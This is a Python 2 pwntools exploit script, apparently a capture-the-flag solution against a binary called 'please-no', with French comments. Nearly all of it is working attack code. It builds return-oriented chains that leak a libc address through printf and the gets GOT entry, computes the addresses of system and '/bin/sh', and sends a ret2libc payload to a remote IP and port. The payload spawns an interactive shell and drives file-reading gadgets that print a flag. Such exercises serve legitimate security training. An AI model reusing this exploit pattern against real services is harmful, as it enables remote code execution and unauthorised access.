#!/usr/bin/python
# encoding: utf-8
from  pwn import *
import time
import sys
elf=ELF('please-no')
def hexa(c):
    s=hex(ord(c))[2:]
    if (len(s) == 1):
        s="0"+s
    return(s)


def toprint(c):
    if ((ord(c) < 32) or (ord(c) > 128)):
        return(".")
    else:
        return(c)

def baseN(num,b,nb=8,sg=0):
        n=num
        if ((sg>0) and (n<0)):
            ss="-"
            n=-n
        else:
            ss=""
        s=""
        while (n < 0):
                n = n + (b**nb)
        numerals="0123456789abcdefghijklmnopqrstuvwxyz"
        while((nb>0) or (n != 0)):
                s=numerals[n % b]+s
                n=n//b
                nb=nb-1
        return ss+s

def dump(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,8)+" : "),
        print hexa(buffer[l]),
        s=s+toprint(buffer[l])
        l=l+1
        if (l % 4 == 0):
            print " ",
            s=s+" "
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",s
            s=""
    print " ",s
def word(t):
    p=1
    s=0
    for i in range(4):
        s=s+ord(t[i])*p
        p=p*256
    return(s)

def bword(t):
    p=1
    s=0
    for i in range(8):
        s=s+ord(t[i])*p
        p=p*256
    return(s)



def dumpg(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %16 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16),
#        s=s+toprint(buffer[l])
        l=l+8
        if (l % 8 == 0):
            print " ",
            s=s+" "
        if (l % 16 == 0):
            print " ",""
    print " "
def dumpgc(debut,buffer):
    l=0
    s=''
    while (l<len(buffer)):
        if (l %8 == 0):
            print(baseN(debut+l,16,16)+" : "),
        print baseN(bword(buffer[l:min(l+16,len(buffer))]),16,16)
        l=l+8
#        s=s+toprint(buffer[l])
    print " "

if (len(sys.argv) > 2):
    host="209.190.1.131"
    TIME=0.1
    port=9003
    offset_system = 0x0003b020
    offset_gets = 0x0005faa0
    offset_binsh=0x0015f60f
    adr_gets=0xf75dcaa0
else:
    host="localhost"
    port=1234
    TIME=0.02
    offset_system = 0x0003aaf0
    offset_gets = 0x0005ef60
    offset_binsh=0x0015cc48
    adr_gets=0xf75f7f60
#    adr_gets=0xf7e4df60
p=remote(host,port)
putcharplt=elf.plt['putchar']
printfplt=elf.plt['printf']
getsgot=elf.got['gets']
pop1=0x80483c9
ret=0x8048190
bizarre=0x8048590
bizarr2=0x80485a3
mode=0x080482bc #0x80487d0
pop2=0x0804878a
test=0x80485ec
jamais=0x80486d0
exitplt=elf.plt['exit']
e84b0=0x080484b0 #met esp dans ebx
e8ac0=0x08048ac0 #??
e84f0=0x080484f0 #?? (les 2 jouent avec 804a038)
e8580=0x08048580 #fait un exit
e8590=0x08048590 #ouvre le fichier en 804a039=NOM, et le balance sur stdout
e8610=0x08048610 #si esp contient b0b01337, il rajoute .teta à NOM
e8650=0x08048650 #si esp contient b0b01337, il rajoute .text à NOM
e8690=0x08048690 #si esp contient 1b0b0c41 et ae13374e, il rajoute flag à NOM
e86d0=0x080486d0 #imprime "here?"
ebobo=0xb0b01337
eb1b1=0x1b0b0c41
eb2b2=0xae13374e
main=0x8048710
PAD="ABCDEFGHIJKLMNOPQRST"
if (0==1):
    f=open("payload","w")
    chainepr1=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(printfplt)+p32(pop1)+p32(ret)+p32(e8580)
    chainepr2=PAD+p32(printfplt)+p32(pop1)+p32(getsgot)+p32(printfplt)+p32(pop1)+p32(ret)+p32(e8580)
    #chaine=PAD+p32(putcharplt)+p32(pop1)+p32(0x41414141)+p32(putcharplt)+p32(pop1)+p32(0x0A0A0A0A)+p32(printfplt)+p32(pop1)+p32(ret)+p32(printfplt)+p32(pop1)+p32(ret)+p32(printfplt)+p32(pop1)+p32(ret)+p32(printfplt)+p32(pop1)+p32(ret)+p32(printfplt)+p32(pop1)+p32(ret)+p32(printfplt)+p32(pop1)+p32(ret)
    chaine=PAD+p32(e8690)+p32(pop2)+p32(eb1b1)+p32(eb2b2)+p32(exitplt)+p32(pop1)+p32(ebobo)+p32(e8590)+p32(e8580)
    #chaine=PAD+p32(e86d0)+p32(e8580)+p32(pop2)+p32(eb1b1)+p32(eb2b2)+p32(e8610)+p32(pop1)+p32(ebobo)+p32(e8590)+p32(e8580)
    f.write(chainepr1)
    f.close()
    p.send(chainepr1+"\n")
    readbuffer=p.recvall(1)
#
#print(readbuffer)
    dump(getsgot,readbuffer)
    adr_gets=word(readbuffer[0:4])
    system=adr_gets+offset_system-offset_gets
    binsh=offset_binsh+adr_gets-offset_gets
    print "S=",hex(system)," ,BSH=",hex(binsh)
    fini=0
else:
#    f=open("payload","w")
    system=adr_gets+offset_system-offset_gets
    binsh=offset_binsh+adr_gets-offset_gets
    chainepr3=PAD+p32(system)+p32(pop1)+p32(binsh)+p32(e8580)
#    f.write(chainepr3)
#    f.close()
    p.send(chainepr3+"\n")
    cmd=sys.argv[len(sys.argv)-1]+"\n"
    for i in range(int(sys.argv[len(sys.argv)-2])):
        p.send(cmd)
    r=p.recvall(15)
    if (len(r)>0):
        print(r)
        p.interactive()
        fini=1
    else:
        fini=0
    p.close()
exit(fini)
